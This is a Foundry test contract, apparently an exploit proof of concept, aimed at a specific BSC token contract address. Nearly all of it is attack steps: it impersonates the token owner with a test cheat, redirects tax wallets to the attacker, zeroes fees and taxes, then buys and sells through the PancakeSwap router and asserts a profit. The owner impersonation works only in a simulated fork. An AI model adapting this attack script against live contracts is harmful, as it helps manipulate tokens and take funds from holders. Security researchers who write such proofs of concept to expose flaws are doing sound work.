contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7;
    address attacker = address(this);
    address owner;
    IRouter02 router;
    Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7 token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner and prepare the attack
        token = Shibtoro_0x8AeB7C2D4758eb51080493E2Cb290d62510659C7(TARGET);
        owner = token.getOwner();
        vm.label(owner, "Original Owner");
        vm.label(address(this), "Attacker");

        // Give ourselves some ETH to work with
        deal(address(this), 10 ether);

        // We'll need the router for trading
        address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap Router BSC
        router = IRouter02(routerAddress);
        vm.label(routerAddress, "PancakeSwap Router");

        // Get the LP pair address
        address lpPair = token.lpPair();
        vm.label(lpPair, "LP Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Step 1: Impersonate the owner to change tax wallets
        vm.startPrank(owner);

        // Change both tax wallets to attacker address
        token.setWallets(payable(address(this)), payable(address(this)));

        // Also exclude ourselves from fees to avoid paying taxes when we trade
        token.setExcludedFromFees(address(this), true);

        // Optionally set taxes to 0% for our trades (optional but cleaner)
        token.setTaxesBuy(0, 0, 0, 0, 0);
        token.setTaxesSell(0, 0, 0, 0, 0);

        vm.stopPrank();

        // Step 2: Buy some tokens to create tax accumulation
        // First approve router to spend our ETH
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = TARGET;

        // Buy tokens with 1 ETH
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 3: Sell tokens to trigger contract swap and send ETH to our wallets
        // Get token balance
        uint256 tokenBalance = token.balanceOf(address(this));

        // Approve router to spend tokens
        token.approve(address(router), tokenBalance);

        // Sell all tokens
        path[0] = TARGET;
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 4: Verify we received more ETH than we started with
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

